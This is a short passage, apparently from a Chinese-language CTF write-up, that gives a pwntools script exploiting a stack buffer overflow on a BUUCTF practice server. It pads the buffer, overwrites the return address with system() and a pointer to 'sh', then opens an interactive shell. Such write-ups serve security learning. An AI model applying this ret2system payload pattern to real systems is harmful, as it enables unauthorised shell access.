所以我们来构造



```python
from pwn import *
r=remote('node5.buuoj.cn',29929)

system=0x80484d0
sh=0x80482ea
r.sendline(b'administrator')
r.sendline(b'1')
r.sendline(b'a'*(0x48+4)+p32(system)+b'a'*4+p32(sh))
r.sendline(b'4')
r.interactive()


```
